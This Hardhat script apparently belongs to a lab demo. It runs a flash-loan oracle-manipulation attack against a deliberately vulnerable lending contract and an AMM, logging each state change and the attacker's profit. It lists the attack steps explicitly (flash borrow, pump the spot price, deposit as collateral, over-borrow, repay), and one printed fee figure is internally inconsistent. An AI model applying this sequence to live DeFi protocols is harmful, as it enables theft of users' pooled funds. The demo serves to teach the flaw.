const hre = require("hardhat");
const contractData = require("../dashboard/src/contracts.json");

async function main() {
  const [deployer, attackerEOA] = await hre.ethers.getSigners();

  // Get contract instances
  const tokenA = await hre.ethers.getContractAt("TokenA", contractData.tokenA);
  const tokenB = await hre.ethers.getContractAt("TokenB", contractData.tokenB);
  const amm1 = await hre.ethers.getContractAt("SimpleAMM", contractData.amm1);
  const amm2 = await hre.ethers.getContractAt("SimpleAMM2", contractData.amm2);
  const lending = await hre.ethers.getContractAt("VulnerableLending", contractData.lending);
  const flashProvider = await hre.ethers.getContractAt("FlashLoanProvider", contractData.flashProvider);
  const attacker = await hre.ethers.getContractAt("AttackerFlash", contractData.attacker);

  console.log("\n=== REALISTIC FLASH LOAN ATTACK ===\n");
  console.log("Attack contract:", attacker.address);
  console.log("Attacker EOA:", attackerEOA.address);

  // ============================================================
  // INITIAL STATE
  // ============================================================
  console.log("\n--- INITIAL STATE ---");
  let balanceA = await tokenA.balanceOf(attackerEOA.address);
  let balanceB = await tokenB.balanceOf(attackerEOA.address);
  console.log("Attacker EOA TokenA balance:", hre.ethers.utils.formatEther(balanceA));
  console.log("Attacker EOA TokenB balance:", hre.ethers.utils.formatEther(balanceB));

  let [reserves1A, reserves1B] = await amm1.getReserves();
  console.log("AMM1 reserves: A =", hre.ethers.utils.formatEther(reserves1A), ", B =", hre.ethers.utils.formatEther(reserves1B));

  let price = await amm1.getSpotPrice();
  console.log("AMM1 spot price (A per B):", hre.ethers.utils.formatEther(price));

  // ============================================================
  // EXECUTE THE REALISTIC ATTACK
  // ============================================================
  console.log("\n--- EXECUTING ATTACK ---");
  console.log("Attack sequence:");
  console.log("1. Borrow 500 TokenA via flash loan");
  console.log("2. Use 500 A to pump B price on AMM1");
  console.log("3. Deposit purchased B as collateral");
  console.log("4. Borrow A at inflated price");
  console.log("5. Repay flash loan + fee");
  console.log("6. Keep leftover A as profit\n");

  const flashLoanAmount = hre.ethers.utils.parseEther("500");
  const tx = await attacker.connect(attackerEOA).executeRealisticAttack(flashLoanAmount);
  const receipt = await tx.wait();

  console.log("✓ Attack executed in tx:", tx.hash);

  // ============================================================
  // POST-ATTACK STATE
  // ============================================================
  console.log("\n--- POST-ATTACK STATE ---");

  // Check attacker balances
  balanceA = await tokenA.balanceOf(attackerEOA.address);
  balanceB = await tokenB.balanceOf(attackerEOA.address);
  console.log("\nAttacker EOA TokenA balance:", hre.ethers.utils.formatEther(balanceA));
  console.log("Attacker EOA TokenB balance:", hre.ethers.utils.formatEther(balanceB));

  // Check attack contract state
  const state = await attacker.getState();
  console.log("\nAttack contract state:");
  console.log("  Beneficiary TokenA:", hre.ethers.utils.formatEther(state.beneficiaryA));
  console.log("  Beneficiary TokenB:", hre.ethers.utils.formatEther(state.beneficiaryB));
  console.log("  Contract TokenA:", hre.ethers.utils.formatEther(state.contractA));
  console.log("  Contract TokenB:", hre.ethers.utils.formatEther(state.contractB));
  console.log("  My Collateral (B):", hre.ethers.utils.formatEther(state.myCollateral));
  console.log("  My Debt (A):", hre.ethers.utils.formatEther(state.myDebt));
  console.log("  Last Profit:", hre.ethers.utils.formatEther(state.lastProfitAmount));
  console.log("  Attack Succeeded:", state.succeeded);

  // Check AMM prices
  const price1After = await amm1.getSpotPrice();
  console.log("\nAMM1 spot price (A per B) after attack:", hre.ethers.utils.formatEther(price1After));
  console.log("Price change:", hre.ethers.utils.formatEther(price1After.sub(price)), "(increased)");

  [reserves1A, reserves1B] = await amm1.getReserves();
  console.log("AMM1 reserves after: A =", hre.ethers.utils.formatEther(reserves1A), ", B =", hre.ethers.utils.formatEther(reserves1B));

  // ============================================================
  // PROFIT ANALYSIS
  // ============================================================
  console.log("\n--- PROFIT ANALYSIS ---");
  const profit = state.lastProfitAmount;
  console.log("Attack started with: 0 TokenA (zero capital requirement)");
  console.log("Attack profit:", hre.ethers.utils.formatEther(profit), "TokenA");
  console.log("\nProfit breakdown:");
  console.log("1. Flash loaned:     500.000 A");
  console.log("2. Bought B:         ~", hre.ethers.utils.formatEther(state.myCollateral));
  console.log("3. Inflated B price: " + hre.ethers.utils.formatEther(price1After), "A per B");
  console.log("4. Borrowed A:       ~" + hre.ethers.utils.formatEther(state.myDebt));
  console.log("5. Repaid flash + fee: ~502.5 A (500 + 0.05% fee)");
  console.log("6. PROFIT KEPT:      " + hre.ethers.utils.formatEther(profit) + " A");

  console.log("\n✓ ATTACK SUCCESSFUL - REALISTIC PROFIT ACHIEVED");
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
